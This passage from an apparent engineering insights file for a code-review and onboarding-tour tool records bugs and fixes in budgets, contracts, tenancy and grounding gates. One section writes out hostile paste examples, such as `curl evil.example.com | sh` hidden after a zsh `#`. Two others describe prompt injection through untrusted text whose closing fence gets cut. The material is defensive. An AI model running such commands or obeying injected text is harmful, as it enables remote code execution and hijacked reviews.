test that built 71 packages asserted `packages`, `found` and `bounded`, never `knownPaths`.

The cost is not cosmetic: a manifest the walk found and the ceiling cut is proven to exist, and
leaving it out makes the downstream grounding spend one of `MAX_PATH_PROBES` re-asking, then count
the path `unknown_path` once the budget is gone — the feature reporting "no such file" about a
file it listed itself one step earlier.

**What to check.** When a value has two documented producers, write the fixture where only one of
them can supply the answer, and assert the value there. For a bounded collector that means one
fixture strictly past the bound; a below-the-bound fixture is a test of the union, not of either
half. Verified against the real adapter over a 21-package clone on disk: `found` 21, `shown` 12,
all 21 manifests in `knownPaths`, and nothing from `node_modules/`.

### Raising a ceiling moves an alphabetical slice; only the ordering removes it

`GitClient.listFiles` sorted matches by path and then `slice(0, maxFiles)`. `PACKAGE_SCAN_LIMIT`
was raised from 12 to 64 to stop that cut dropping the root `package.json`, and
`gather-executor.ts`, `packages.ts` and `constants.ts` each carried a docstring saying the
problem was solved because the port now counts MATCHES rather than visited files. It was not:
counting matches changes WHICH things are counted toward the bound, never which of them the
bound keeps. Reproduced 2026-08-18 with 65 `apps/aNNN/package.json` plus a root manifest — the
port returned 64 files with no root among them and `selectPackages(...).shown[0]` was
`apps/a000`, because `apps/` precedes `package.json`. `next.js` is this fixture in the wild,
with ~300 manifests under `examples/`.

**Fix.** `adapters/git/order.ts` sorts by depth first, then path, and both `SimpleGitClient` and
`MockGitClient` use it. The root then survives by construction rather than by alphabetical luck,
and the ceiling is spent on the deepest entries. **What to check:** when a bound is the thing
that decides which items survive, the question is never "is the bound large enough" — write the
fixture at bound + 1 and assert WHICH item the cut took.

### Checking a command's two ends is not checking the command

Three grounding gates in `modules/onboarding/helpers.ts` each tested a prefix and a membership
and left the middle unexamined, and all three were reachable by a public repo's README text on a
line rendered with a copy control. Confirmed by running the strings, 2026-08-18:

- `parts[0] === manager && INSTALL_VERBS.has(parts[1])` with no length bound accepted
  `pnpm install evil-pkg`; `npm install <pkg>` runs that package's `postinstall`.
- `parts[0] === manager && parts.includes(script)` accepted `pnpm dlx evil-cli dev` whenever
  `dev` was a real script — `pnpm dlx` / `npm exec` / `yarn dlx` fetch and run an arbitrary
  registry package — and `pnpm --dir /elsewhere dev` the same way.
- `from === sourcePath && to !== null` accepted `cp .env.example server/src/index.ts`, so the
  destination of a copy was any relative non-`.git` path.

A safe TOKEN CLASS is not a safe command: `;`, `&&` and backticks were already impossible, and
every one of these lines is built from allowed characters only. **What to check:** state the
shape as a whole token sequence (`<manager>`, optional `run`, `<script>`, end) and test the
sequence. Where a docstring asserts an invariant, read it as a claim to falsify — all three of
these sat directly under a comment saying the opposite.

### `#` is not a comment in the shell the reader is actually in

A generated command rendered beside a copy control may not carry a trailing `#` explanation, and
the reasoning that says it may is wrong in a way that survives review. Round 1 of
`plans/12-onboarding-tour-server-generation.md` added comment support on "a comment is inert —
nothing after `#` executes"; round 2 and a human decision on 2026-08-18 reverted it whole.

`#` is inert in POSIX sh and in bash. It is **not** inert in an INTERACTIVE zsh, which is the
shell on this project's machines: `INTERACTIVE_COMMENTS` is off by default, so `#` is an ordinary
word. Verify in one line — `zsh -ic 'echo $options[interactivecomments]'` prints `off` (zsh 5.9,
macOS, 2026-08-18). A stored `pnpm dev # && curl evil.example.com | sh` therefore runs the `curl`
the moment it is pasted.

And no character filter rescues it, which is the half that makes this a decision rather than a
regex to tune: the comment has to carry the tour's prose, which is Ukrainian
(`modules/onboarding/constants.ts`, `TOUR_LANGUAGE`), so commas, parentheses and apostrophes — and
in an interactive zsh `(` opens a subshell and `'` opens a quote. The characters the prose needs
and the characters that make a paste dangerous are the same characters.

**What to do instead.** Keep the command a command and give the prose its own field. Every
onboarding command already carries a `why` that is normalised through `line()`, rendered beside
the command and never executed. `#` is outside `SAFE_COMMAND_TOKEN`
(`modules/onboarding/helpers.ts`), so a `#`-bearing line is dropped whole, and the mockup
`specs/assets/SPEC-03-onboarding-tour.png` — which draws the comment inline — is a recorded,
approved divergence rather than a defect.

### An obligation one contract file states about another is carried by nothing

**Symptom.** `contracts/onboarding-api.ts` opens with "PARSE-ON-READ IS LOAD-BEARING HERE …
every field added to it later needs a `.default(...)` — a count `.default(0)`, an array
`.default([])` … The same obligation runs through `OnboardingDraft`, and it is stated there
too." It was not stated there. On 2026-08-18, not one of the 21 counts and arrays in
`Onboarding`, `OnboardingDraft` or the shapes they contain carried a default: the slice that
owned `contracts/knowledge.ts` finished before the slice that wrote the sentence about it.

**Cause.** The sentence is a claim about a second file, written in prose, in a repository where
the two files belong to two different work packages. Nothing reads it. `tsc` typechecks a schema
with defaults and one without identically, `pnpm arch` sees no dependency, and the seam test that
does exist (`test/onboarding-contract.test.ts`) asserts key identity across `.extend()` — a
different property. The first signal would have been a reader opening a saved tour, months later,
after some new field landed: `OnboardingRepository.get` degrades a failed parse to `null`, so the
page says "nothing generated yet, press Generate" about a tour that is whole in the jsonb column
and was paid for once.

**Fix.** The defaults, and two tests that fail without them, in `test/contracts.test.ts` — "a
document written before the counts and arrays existed parses to zeros and empty lists" and its
nested sibling. Both work by STRIPPING keys from the fixture rather than by listing what should
be defaulted, which is what makes them fail on the day someone adds a field and forgets.

The durable form, not written here, is structural: walk `Object.keys(OnboardingDraft.shape)` and
assert every `ZodArray` and every `ZodNumber` is wrapped in a `ZodDefault`. A prose obligation
between two contract files should be read as unimplemented until a test names it.

### `last_indexed_sha` is not a witness that the index changed

**Symptom.** A gate reads `repoIntel.getIndexState(repoId)`, long work follows, and the result is
stamped with the state the gate approved. A reindex that lands inside that window is invisible to
any check that compares `lastIndexedSha`, because a manual `POST /repos/:id/resync` on an
unchanged HEAD writes the row back with the sha it already had. Found 2026-08-18 in
`modules/onboarding/service.ts` during review of the tour: a ~2-minute generation could be built
from an emptied index and saved looking perfectly fresh.

**Cause.** Two facts that only bite together. `repo-intel/pipeline/full.ts` calls
`repository.deleteAllForRepo(repoId)` — every symbol and every reference for the repo — around 65
lines BEFORE it writes the new `repo_index_state` row, so for the whole middle of a reindex the
state row still says `full` while the index it describes is empty. And the state row is keyed by
sha in everyone's head but not in fact: a same-HEAD resync changes no sha, so `isStale` answers
`false` about a tour built from nothing.

**Fix.** Compare `updatedAt`. Every writer of that row bumps it — `upsertIndexState`,
`touchIndexState` and `advanceSha`, `repo-intel/repository.ts:294`, `:327`, `:339` — so it is the
only field that moves on every rewrite. `modules/onboarding/status.ts` has it as `indexMoved(before,
after)`, and `service.ts` re-reads the state after the generator returns and refuses the write with
a 409 rather than saving. The check costs one extra read per generation; the alternative was a thin
document that no gate and no reader could tell from a good one.

**Where else this applies.** Any consumer that gates on `getIndexState` and then does slow work on
what the index holds. `blast` and `brief` read the facade the same way; neither re-checks today,
and neither writes a document stamped with the state, which is why the same race is cheaper there —
but a "the index was full when I asked" read is a statement about a moment, not about the request.


### The last input of a budget walk is all-or-nothing unless it is offered item by item

**Symptom.** The Onboarding Tour's `project_docs` input was `dropped` on every real generation of
this repository, never `truncated` and never partly included — so the tour that shipped on
2026-08-18 was written having seen neither `README.md` nor `AGENTS.md`. The stored record said so
plainly and nobody read it: `{"id":"project_docs","status":"dropped","tokens":3216,"detail":null}`.

**Cause.** `modules/_shared/budget.ts` stops at the FIRST candidate that does not fit and marks it
and everything after it `dropped`; it truncates only when `blocks.length === 0`, i.e. only the very
first candidate. So any candidate that is not first is included whole or not at all. `project_docs`
is last by D13 priority, and `SAMPLE_FILE_COUNT` (20) × `MAX_FILE_CHARS` (6 000) took 17 964 of the
~22 000 block tokens ahead of it — measured 2026-08-18 against
`server/clones/Holubinka/dev-digest`, repo map 1 514, configs 753, chains 60. The 3 216 tokens of
documents never had 3 216 tokens of room, and 1 773 tokens of budget went unspent every run.

**Fix.** Offer the input one item at a time, the way `file_samples` already is in
`generate-executor.ts` `buildCandidates`. Splitting `project_docs` per document turned the same run
into `1 of 7 documents` — an answer instead of a refusal — with no other input losing a single
token, because it spent headroom that was already idle. A per-item cap is what makes the split
worth having: without `MAX_DOC_CHARS`, one 12 985-character `mcp/README.md` stops the walk and takes
every document behind it, which is the whole-block failure again one level down.

**Where else this applies.** Any caller of `selectWithinBudget` whose last candidate is a
multi-item block. Check `inputs[]`-style records for a row that is only ever `included` or
`dropped`: a status that never takes its middle value is the signature.

**2026-08-18, later the same day.** Splitting per item was not enough on its own — it bought
`1 of 7 documents`, because 19 samples still stood ahead and left ~1 500 tokens. A human then
reversed the priority pair, and the same clone measured `7 of 7 documents` against
`13 of 19 files`: the documents cost 7 077 tokens and displaced 6 samples worth 6 079. Two things
this teaches beyond the first fix. Splitting an input changes what a starved input DOES (drops its
tail instead of vanishing) but not whether it is starved — that is the ORDER, and only the order.
And the order is stated in three places that have to agree: `OnboardingInputId` in
`vendor/shared/contracts/knowledge.ts` (which builds the record's rows, so it decides the screen),
`buildInputBlocks` in `prompt.ts`, and `buildCandidates` in `generate-executor.ts`. Leaving the
enum stale while moving the walk compiles, passes `pnpm arch`, and silently prints the rows in an
order that no longer explains which one got cut.

### `inputs[].detail` is where a per-item cap becomes observable, and it is easy to leave null

**Symptom.** `MAX_DOC_CHARS` cuts a document before it is fenced, so by the time anything can be
recorded the block holds the capped text and "this was cut" is no longer decidable from it.

**Cause.** The cap runs in `prompt.ts` `fencedItem`, the record is built in `generate-executor.ts`
`inputRow`, and nothing travels between them but the rendered block.

**Fix.** Carry the fact on the candidate (`InputCandidate.docShortened`) and spend it on the one
free-form field the contract already has: `detail` now reads `1 of 7 documents, 1 shortened`.
Compare by CODE POINT — `[...text].length`, the unit `truncateCodePoints` cuts in — not by
`.length`, which is UTF-16 units and calls a 3 000-character astral document shortened when the cap
never touched it. `status` was deliberately left alone: the contract defines those four words in
terms of the budget walk, and a document the ceiling shortened did reach the model in the state the
run intended.

### A grounding gate only ever fires on what the 4 000-character doc cap left standing

The onboarding tour learned a third setup shape on 2026-08-18 — a script the repository committed,
`./scripts/dev.sh` — and the gate that accepts it (`modules/onboarding/helpers.ts`,
`setupCommandIsAuthorised`) is only half the feature. The other half is whether the model was ever
shown the string. It cannot be: `.sh` files reach the input through no other route. The index does
not parse them, the package walk asks `listFiles` for the *name* `package.json`, and the ranked
samples are index output. The only path is a project document that happens to mention the script in
prose.

Measured against this repository's own clone: `MAX_DOC_CHARS` is 4 000
(`modules/onboarding/constants.ts:253`) and `readDocs` cuts from the END, so of the two root
documents only one carries the line. `README.md` is 8 822 characters and first names
`./scripts/dev.sh` at character 4 482 — 482 past the cut, so the model never sees it. `AGENTS.md`
is 8 870 characters and names it at 877, so it does. The feature works here on that margin alone,
and a repository that documents its bootstrap script only in a long README gets no such command at
all while every test stays green.

The general shape, which is the part worth carrying: **when a feature depends on a fact reaching
the model through prose, the cap is part of the feature.** Measure where the fact sits in the file
rather than confirming the file is read — the two questions have different answers and only one of
them is the one that matters. Cheap to check, one `node -e` over the clone:
`const t=fs.readFileSync(p,'utf8'); [t.indexOf(needle), [...t].length]` against `MAX_DOC_CHARS`.


### A contract field with `.default()` makes a MISSING WRITE invisible, not just a missing read

`.default()` on a jsonb-backed contract field is required here — without it the day a field is
added every stored document stops parsing ("A jsonb column is untyped input: parse it on read, or
`.default()` never fires", under Codebase Patterns). What it also does is hide the other half: the
producer that never sets the field writes a record that parses, reads as `0` or `[]`, and fails no
gate anywhere.

Measured on 2026-08-18, between the two halves of SPEC-04: after `chains_supplied`,
`longest_chain_files`, `system_tokens` and `duration_ms` were added to `OnboardingDraft`, the
real stored tour of `Holubinka/dev-digest` served all four as `0` through `GET
/repos/:id/onboarding` — indistinguishable from a repository with no import graph. `pnpm arch`,
`pnpm typecheck` and 1 206 unit tests were green throughout. TypeScript catches this on an object
LITERAL (the four missing keys were five compile errors in `generate-executor.ts`), and catches
nothing at all when the producer spreads, maps or builds the object any other way.

So: for every newly defaulted field, write the assertion that fails when the writer omits it, and
prove it by setting the field to its own default in the producer and watching the case go red —
`chains_supplied: 0` in `generate-executor.ts` turned exactly two cases of
`test/onboarding-generate.test.ts` red, and nothing else in the repository noticed.



### A ceiling test that asserts the ceiling is REACHED locks in the overflow it was written to catch

**Symptom.** Fixing a real defect turned `onboarding-generate.test.ts` red with
`expected 6 to be 200`.
**Cause.** The test was named "spends no more than MAX_PATH_PROBES reads on one answer" but
asserted `expect(audit.probes).toBe(MAX_PATH_PROBES)` over a fixture of 210 tasks. That passes
only while the answer overflows the ceiling. The fix — collecting path claims only from the tasks
that grounding would actually keep — stopped the overflow, so the assertion that the ceiling was
*hit* became an assertion that the defect was *present*.
**Fix.** Split it. One test keeps the ceiling honest using a source that is genuinely uncapped
(flows), and one asserts the new guarantee: probes from tasks equal `MAX_TASKS`, and
`setup_commands` still ground — the list that used to vanish wholesale once the ceiling was
reached inside the task loop. When a bound test fails after a fix, read whether it was measuring
the bound or the thing overflowing it before touching the number.

### A cancel is two writes, and the half that answers `{ok:true}` is not the half that stops the spend

**Symptom.** 2026-08-26: cancelling a `queued` run of a multi-run returned `{ok:true}`, the row
kept saying `queued`, and when the pool reached the job the agent ran and billed in full.

**Cause.** `ReviewService.cancelRun` is three steps — `runBus.cancel()`, `cancelRunIfRunning()`,
`runBus.complete()` — and it awaits none of their answers. `cancelRunIfRunning` was guarded on
`status='running'`, so on a waiting row it updated zero rows; then `RunBus.complete` **deletes**
the in-memory cancelled flag (`platform/sse.ts:78`), so the only other record of the cancellation
was gone one line later. The route reports the *request*, never the effect.

**Fix.** For a run that has not started, the DB row is the ONLY durable cancel signal — the bus
flag is for a live runner that is already inside a checkpoint loop. Both writes must agree on what
"in flight" means (`IN_FLIGHT = ['running','queued']` in `repository/run.repo.ts:16`), and the
worker must honour the boolean `startAgentRun` returns instead of proceeding unconditionally. When
a repository function returns a boolean nobody reads, that is a guard that has already stopped
guarding: `run-executor.ts` discarded it while the doc comment above it claimed it was "what stops
a run cancelled while it waited from being resurrected".

### A "finished" flag written after the fan-out races the client that the fan-out just woke up

**Symptom.** SPEC-05's multi-run summary time is a measured span: `finished_at - ran_at`, stamped
by `MultiRunService.launch`'s `.then()` once `executeRuns` resolves (AC-155). A multi-run with all
runs terminal and no `finished_at` is one the reaper closed after a restart, and the page prints
`—` plus "run interrupted" (AC-158). Those two rules collide for a few milliseconds on every
perfectly ordinary run.

**Cause.** The last run's `runBus.complete(runId)` fires *inside* `runOneAgent`, before the pool
resolves. That close is exactly what makes the client refetch (`useMultiRunColumnEvents`'
`onRunClosed` → `refetch`). So the read the feature is designed to trigger arrives while the
`UPDATE ... SET finished_at` is still in flight — every column terminal, no completion recorded,
which is the signature of an interrupted run. An ordinary multi-run would flash "interrupted".

**Fix.** `multi-run-service.ts` keeps a module-level `EXECUTING_HERE: Set<string>` — the multi-runs
*this process* is still working on — added in `launch` and removed in the `.finally` after the
stamp. `get` treats membership as "still going", so the window reports `elapsed` instead. It is not
belt-and-braces: it is a closer reading of AC-158, whose condition is "the reaper closed them after
a restart", and after a restart the set is empty. The general shape: any state derived from "a
background write has not happened yet" needs a way to tell *not yet* from *never*, and process-local
in-flight membership is the cheapest one when the writer is in this process. `test/multi-agent.it.test.ts`
polls `finished_at` rather than the runs' statuses for the same reason.

### Requiring two agents per position emptied "Where agents disagree" on real data

`buildConflicts` in `server/src/modules/reviews/conflicts.ts` used to drop every component that
only one run had touched as soon as two agents reached `done`. Measured against the dev database
on 2026-08-27, multi-run `ebd3b426`: five agents, all `done`, nine findings between two of them,
none overlapping another agent's — **0 positions**. The screen showed an empty section beside two
columns full of findings, which is how the rule was caught.

The mockup had said so from the start: `specs/assets/SPEC-05-multi-agent-review-columns.png` draws
"Magic number 3600" as one SUGGESTION beside two `did not flag`. A FINISHED agent's silence is its
opinion and is what the section exists to show; only a run that never reached `done` has none.
The human reversed the rule on 2026-08-27 — every component is a position now, `not_reviewed`
untouched.

Before believing a grouping rule here, run it against real rows rather than fixtures. Positions
are recomputed on every read and never stored, so a second read-only API beside the human's dev
server answers in one request: `cd server && API_PORT=3199 pnpm exec tsx src/server.ts`, then
`curl localhost:3199/multi-agent-runs/<id>`. The `DATABASE_URL` default already points at the
dev Postgres on 5434.
### A route-level tenancy test can pass with the repository's workspace filter deleted

**Symptom.** Writing L06's foreign-workspace case (2026-08-23) I asserted, over HTTP, that a
second workspace's agent answers 404 on six routes and that its completed batch appears in
neither `GET /eval-dashboard` nor `GET /eval-batches/compare`. Then I deleted
`c.workspace_id = ${workspaceId}` from `EvalRepository.completedBatches` to check the test was
not vacuous. **Every assertion stayed green.**
**Cause.** `EvalService.dashboard` builds its cards from `agentsRepo.list(workspaceId)` and skips
any `owner_id` not in that map; `compare` calls `agentsRepo.getById(workspaceId, …)` and answers
404 when it misses. Both are correct — and both are a SECOND lock that hides whether the first
one exists. The primary defence for `eval_runs` is the join, because that table has no
`workspace_id` of its own (`INSIGHTS.md` § "parent scoped, child assumed"); a service-level agent
lookup is defence in depth, and defence in depth is exactly what makes the primary defence
untestable from outside.
**Fix.** Assert the repository directly, in the same `*.it.test.ts`, alongside the HTTP
assertions — `test/eval-routes.it.test.ts` calls `new EvalRepository(pg.handle.db)` and checks
`completedBatches`, `batchById`, `latestRunPerCase`, `runsForCases`, `getCase`, `listCases`,
`caseCountsByOwner` and `updateRunEnvelopes` from BOTH workspaces: empty from this one, non-empty
from the other. Removing any one of the four workspace filters now fails one assertion each,
verified individually. **When a slice has two layers of tenancy, a route test only ever proves the
outer one.**

### Filtering inside the same `DISTINCT ON` that computes "latest" answers a different question than filtering after it

**Symptom.** Building the skill-centric mirror of `latestRunPerCase` (`EvalRepository.casesForSkill`,
2026-08-23) — "every case whose skill X actually shaped" — the first draft put the skill filter in
the `WHERE` clause of the same `DISTINCT ON (r.case_id) ... ORDER BY r.case_id, r.ran_at DESC` that
picks each case's latest run. It typechecked, ran, and returned plausible-looking rows.
**Cause.** `WHERE skills @> '[...]'` INSIDE that query restricts the candidate rows BEFORE
`DISTINCT ON` picks the newest survivor — so it answers "the newest run where this skill fired",
not "this case's newest run, and did it have this skill". Those agree only when a case's skill
history never regresses. A case run once with the skill bound, then again after the skill was
unbound, has a latest run that CORRECTLY carries no skills — but the buggy query still returns the
older, stale run and reports it as current. Proved with a live test: bind, run (pass), unbind,
run again (skill absent from the true latest run) — the buggy version still listed the case;
`git show` of the fix commit has the one-line diff.
**Fix.** Compute "latest" in an unfiltered CTE first, THEN filter the CTE's output:
```sql
WITH latest AS (
  SELECT DISTINCT ON (r.case_id) ... ORDER BY r.case_id, r.ran_at DESC  -- no skill filter here
)
SELECT ... FROM latest l WHERE l.skills @> '[{"id": "..."}]'::jsonb    -- filter AFTER
```
Any "latest per group, filtered by a condition that can change between runs" query needs this
two-step shape — filtering inside the `DISTINCT ON` is the trap, and it will typecheck and mostly
look right, which is exactly why it survived a first pass.

## Codebase Patterns

### The allowed-refs invariant is checkable in one line against a real PR

A brief block's `refs` must be exactly what that block's rendered text puts in front of the
model, and the whole invariant reduces to one filter over the assembled input:

```ts
[...buildAllowedRefs(fit.included)].filter((ref) => !fit.user.includes(ref))   // must be empty
```

Run against PR #20's real blast view and file list on 2026-08-16 (fetch `GET /pulls/:id/blast`
and `GET /pulls/:id`, feed them into `buildBlocks` → `fitToBudget` → `buildAllowedRefs`; no model
call, no spend): **0** of 106 allowed refs were absent from the prompt after the fix, and **105**
of 214 were absent before it. Reach for this before believing a unit test that only ever sees a
one-symbol fixture — a 170-file PR against a 40-path cap is where the two halves of the set come
apart, and no hand-written fixture is that shape by accident.

**Added 2026-08-16.** It is a test now as well as a diagnostic — see "An invariant maintained at
the call site breaks once per call site" above. Keep running it against a real PR anyway: the
same run confirmed 0 of 106 after the third fix, and it is the only check that sees the shapes a
fixture author does not think of. That run is also where the caps got their numbers, because real
data disagreed with the arithmetic — 4 of the 1835 rendered parts of PR #20's blast view are
longer than 120 code points.

### Clamp the parts of a rendered line, never the finished line

A line assembled from untrusted parts and then truncated has lost the ability to say which parts
survived: it is one string, and the names inside it are no longer addressable. So anything that
declares a name printed — `blastBlock` adding a path or an endpoint label to the allowed set —
must clamp that name **before** the line exists and register the clamped string, not the source
one (`modules/brief/helpers.ts`, `part()` against `MAX_BLAST_PART_CHARS`).

The line ceiling then follows from the part caps instead of being chosen beside them:
`MAX_BLAST_FACT_CHARS` is 3 × `MAX_BLAST_PART_CHARS` + 32, which is why it moved when the part
cap did. Pick the part cap from measured repository content, not from a round number — 120 looked
generous for a file path and cuts four real ones in this repo.

### A DTO mapper without a return type is unchecked, even where the caller has one

**Symptom.** `toScanDto` (`modules/conventions/helpers.ts:254`) had no return annotation, and
nothing anywhere rejected an extra field on the object it returns — despite the caller assigning
it into `ConventionsResponse`.

**Cause.** TypeScript's excess-property check fires on a *fresh object literal*, not on the
result of a call. `service.ts:86` assigns `toScanDto(scan)`, so the literal inside the mapper is
only ever checked against its own inferred type, which by definition matches. Measured
2026-08-09: adding `bogus: row.repoId` to the literal left `pnpm typecheck` clean; with
`: ConventionScan` on the function it fails with `TS2353 … 'bogus' does not exist in type`. A
field added off a `*Row` would have shipped over the wire with no contract declaring it.

**Fix.** Annotate every `to*Dto` with the contract type from `@devdigest/shared`, the way
`toCandidateDto` (line 235) already does. The annotation is the only place the shape is checked;
it is not documentation.

### Second occurrence (2026-08-16), from the other side — a contract field the route never serves

**Symptom.** `ReviewRecord` gained `head_sha`: the Zod contract, both vendored copies, the
`reviews` table, migration `0020`, and a passing `test/contracts.test.ts`. `pnpm arch`,
`pnpm typecheck`, 900 unit tests, `reviewer-core` and `diff -r` on the vendored pair were all
green in three packages — and `GET /pulls/:id/reviews` still answered with the same 12 keys it
answered with before, `head_sha` not among them. In the browser the field read `undefined`
rather than `null`, because `client/src/lib/api.ts` parses nothing at runtime, so no layer
between the column and the component had anything to say.

**Cause.** The same root cause as the entry above, mirrored. `ReviewDto`
(`modules/reviews/helpers.ts:22`) is a hand-written interface rather than `ReviewRecord`, and
`GET /pulls/:id/reviews` (`modules/reviews/routes.ts:165`) declares no `schema.response`, so the
contract and the payload are two independent declarations that merely happen to agree. The
entry above measured the extra-field direction, where a field ships that no contract declares;
this is the missing-field direction, and it is the more expensive of the two — an undeclared
extra is noise, whereas a declared field that never arrives is a feature that silently does not
exist, in a shape every typecheck endorses.

**Fix.** Widening a record contract in `vendor/shared` is not done until the mapper that serves
it is widened too — `reviewToDto`, `toScanDto`, and their kin. Confirm on the wire, not in the
type: `curl -s localhost:3001/pulls/<id>/reviews | python3 -c "import sys,json;
print(sorted(json.load(sys.stdin)[0]))"` prints the key list the client will really see. The
structural fix is the annotation the entry above already prescribes; `ReviewDto` still does not
carry it as of 2026-08-16, so the next widening of `ReviewRecord` has the same hole waiting.

### Truncate untrusted text BEFORE `wrapUntrusted`, never after

The order looks like a style choice and is not. `wrapUntrusted(label, text)`
(`reviewer-core/src/prompt.ts:30-34`) returns `<untrusted source="…">\n{text}\n</untrusted>`, so
capping the *wrapped* string is what eventually cuts the closing fence off — and a prompt whose
last delimiter is missing hands everything after it to attacker-controlled text. Capping the raw
string first cannot: the fence is added afterwards.

Worked example: `renderClassifierInput` (`modules/intent/helpers.ts`) truncates the PR body and
the linked issue, then wraps. `server/test/intent-helpers.test.ts` pins it with a body 500 code
points over the cap and asserts the block count still matches the fence count. Note also that
the escape `wrapUntrusted` applies (`</untrusted>` → `<\/untrusted>`) makes the wrapped string
slightly longer than the cap — which is correct, because the cap is a statement about the source
text, not about the rendered message.

### A service the container constructs must not import `Container`

**Symptom.** `pnpm arch` on 2026-08-05: `no-circular: src/modules/intent/service.ts →
src/platform/container.ts → src/modules/intent/service.ts`. Typecheck was clean.

**Cause.** `container.ts` needs a value import of the service to build it for a getter, and
the service names `Container` for its constructor. `tsPreCompilationDeps` is on, so the
`import type` counts as an edge and the two files form a cycle. `RepoIntelService` has the
same cycle and it is one of the entries in the arch baseline — which is why the pattern reads
as safe when you copy it.

**Fix.** Declare the slice of the container the service actually needs as a structural
interface in the module's own `types.ts` and take that instead — `modules/intent/types.ts`
`IntentContainer` is the worked example, and `run-executor.ts:21-26` does the same with its
`Logger`. A real `Container` satisfies it by construction, so `new IntentService(this)` in
the composition root is unchanged and no adapter is imported.

The rule of thumb: **only a service the container does NOT construct may import `Container`.**
`AgentsService` and `ReviewService` can, because their routes build them.

### `modules/_shared/` is subject to `no-sql-outside-repository` like anything else

Moving `feature-models.ts` out of `modules/settings/` on 2026-08-05 to make it reachable from
`modules/intent/` turned a baselined violation into a new, unbaselined one: the baseline keys
on the `from` path, and `REPOSITORY` in `.dependency-cruiser.cjs:29` only matches
`src/modules/<slice>/repository(.ts|/)`. `_shared/` is neither a repository nor a route.

So a cross-slice helper that reads the DB needs its SQL to leave with it. The route taken was
`SettingsRepository` (`modules/settings/repository.ts`) hung off `container.settingsRepo`, with
`_shared/feature-models.ts` reaching it through a structural `SettingsReader` — which also
avoids `_shared/` importing the `settings` slice. Net effect on the baseline: 20 entries → 19,
and the fixed entry was removed by hand rather than by `arch:baseline`.

### A link table's foreign key proves existence, not tenancy

`agent_skills.skill_id` references `skills.id` and nothing more. `AgentsService.setSkills`
verified that the *agent* belonged to the caller's workspace and then handed arbitrary skill
ids straight to the insert, while `linkedSkills` joined `t.skills` with no workspace
predicate at all. So `POST /agents/:id/skills {"skill_ids":["<other-tenant-skill>"]}`
succeeded, and once L02 made skill bodies reach the prompt that is another workspace's text
instructing this workspace's review.

It was unreachable for as long as `skills` stayed empty, which is exactly why it survived
review: an over-provisioned table hides its own tenancy bugs until the lesson that fills it.
Closed on 2026-08-03 by checking ids against the workspace before the write
(`AgentsRepository.skillIdsInWorkspace`) **and** re-checking tenancy inside the
`linkedSkills` join, so a stray row already in the table is invisible rather than
load-bearing. `server/test/skills.it.test.ts` pins both halves.

When the next lesson fills `conventions`, `memory`, `eval` or `ci`, audit the same shape
before wiring it up: parent scoped, child assumed.

### Rollups on `GET /repos/:id/pulls` are read-time maps, and null ≠ zero

The list endpoint denormalises nothing. Each rollup is its own `inArray` query over the
page's PR ids, grouped in JS into a `Map`, then read in the final `rows.map`:
`latestReviewByPr` (score, latest-wins), `totalCostByPr` (cost, summed over runs) and, since
2026-07-28, `findingsByPr` (severity counts + a 3-item preview, summed over runs like cost).
Follow that shape for the next one rather than adding a join or a denormalised column.

The subtlety is the empty case. A PR with reviews but no findings must land in the map with
zeros, while a PR never reviewed must be absent and serialise as `null` — the UI renders
`0 · 0 · 0` and `—` differently, and collapsing them loses the distinction. `findingsByPr`
is therefore seeded from `latestReviewByPr.keys()`, not from the findings rows.

### Truncating text for an API response with `String.slice` corrupts emoji

**Symptom.** A truncated string arrives at the client with `�` at the end, or a JSON
consumer chokes on an unpaired surrogate.

**Cause.** `slice` counts UTF-16 code units. Anything outside the BMP — every emoji — is two
units, so a cut at a fixed offset can land between the halves and leave a lone surrogate.
Reviewer-written rationales routinely contain emoji.

**Fix.** Cut by code point: `[...text].slice(0, max).join('')`. `truncateChars` in
`modules/pulls/status.ts` does this for the PR list's rationale preview, with a test that
feeds it 250 astral characters.

### The severity vocabulary is enforced in `topFindings`, not at the DB

`findings.severity` is plain `text`. `topFindings` in `modules/pulls/status.ts` drops
anything outside CRITICAL / WARNING / SUGGESTION instead of ranking it last, because the
client maps severity to an icon through a lookup with no fallback (see
`client/INSIGHTS.md`). A bad row costs one missing preview entry, never a broken page.

### Two modules count `agent_skills` in opposite directions, and both need the same two joins

`SkillsRepository.list` counts agents per skill (`agent_count`, since the Skills list shipped);
`AgentsRepository.list` counts skills per agent (`skill_count`, 2026-08-06, for the Agents card
badge). Both read `agent_skills` — a table the **agents** module owns both sides of — and each
count only agrees with the list beside it if it repeats two non-obvious choices:

- The far table's workspace test goes in the `leftJoin`, **not** the `WHERE`. In the `WHERE` it
  drops every row with no bindings at all, which are exactly the rows the badge must report as 0.
- Count the far table's id (`countDistinct(t.skills.id)`), not the link column. A foreign key
  proves a skill id exists, not that this workspace can see it, and `linkedSkills`
  (`modules/agents/repository.ts:224`) already re-checks tenancy before a body becomes a prompt
  block. Counting `agent_skills.skill_id` would put a number on the card for a skill the Skills
  tab never lists. `test/agents-skill-count.it.test.ts` writes such a link directly to the table
  — the service refuses to create one — and asserts it is not counted.

Change one direction and check the other: the two are read side by side in the UI, and
`useSetAgentSkills` has to invalidate both query keys because one POST moves both numbers.

### A pre-pass living in another slice reaches its consumer through the container, with NO import

`no-cross-module` (`.dependency-cruiser.cjs:139-158`) forbids `modules/reviews/**` from importing
`modules/intent/**`. It is not a rule you route around, because **the edge is reported against
the file you import** — a re-export barrel in `reviews/` pointing at `intent/` is the same edge
with one more hop, and `_shared/` only helps for code that genuinely belongs to neither slice.

The sanctioned route is the composition root. `run-executor.ts` calls
`this.container.intentService.derive(...)` and contains **no import statement naming
`modules/intent/` at all** — it works because dependency-cruiser follows imports, not inferred
types, and `container.intentService` is typed as the `IntentDeriver` port. The same file already
did this with `this.container.repoIntel.getCallerSignatures(...)`; copy that, not an import.

The part that is easy to get wrong is the return trip. The executor needs the *rendered*
`## Intent` prompt section, and `renderIntentSection` is a pure helper inside `modules/intent/` —
so importing it is precisely the violation you just avoided. Two ways out, and the second is
better: put the helper in `modules/_shared/`, or **have the result object carry the rendered
string**. 05 took the second — `IntentDerivation`'s `ok: true` branch has
`section: string`, rendered inside `IntentService` — so nothing new crosses and `_shared/` does
not grow a file per feature. Generalised: **when a cross-slice call needs a formatted value back,
format it on the producing side and return it; do not export the formatter.**

Two supporting rules that fall out of the same design. The port
(`modules/intent/types.ts`) is expressed in primitives and contract types only — no `PullRow`, no
`Db` — because it is consumed across a ring boundary (§3.5); the repository is supplied by
`platform/container.ts` (`new IntentService(this, new IntentRepository(this.db))`) rather than
defaulted inside the service, which is what keeps `Db` off the port at all. And `derive` **never
throws**: one discriminated `{ ok }` result serves both a route that must report the failure as a
